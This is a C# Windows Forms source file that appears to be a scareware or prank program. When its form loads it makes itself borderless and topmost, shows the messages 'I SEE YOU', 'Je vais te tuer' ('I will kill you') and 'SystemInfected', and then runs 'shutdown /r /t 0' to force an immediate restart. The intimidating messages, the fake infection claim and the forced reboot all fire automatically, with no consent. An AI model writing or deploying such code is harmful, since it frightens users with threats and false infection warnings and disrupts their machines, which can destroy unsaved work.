﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Screens
{
    public partial class Form4 : Form
    {
        public Form4()
        {
            InitializeComponent();
        }

        private void Form4_Load(object sender, EventArgs e)
        {
            this.TopMost = true;
            this.WindowState = FormWindowState.Maximized;
            this.FormBorderStyle = FormBorderStyle.None;
            this.BackColor = Color.White;
            this.TransparencyKey = Color.White;
            MessageBox.Show("Hello 👁️👁️👁️", "I SEE YOU 👁️", MessageBoxButtons.OK, MessageBoxIcon.Error);
            MessageBox.Show("Je vais te tuer");
            Process.Start("shutdown", "/r /t 0");
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
            MessageBox.Show("SystemInfected");
        }
    }
}
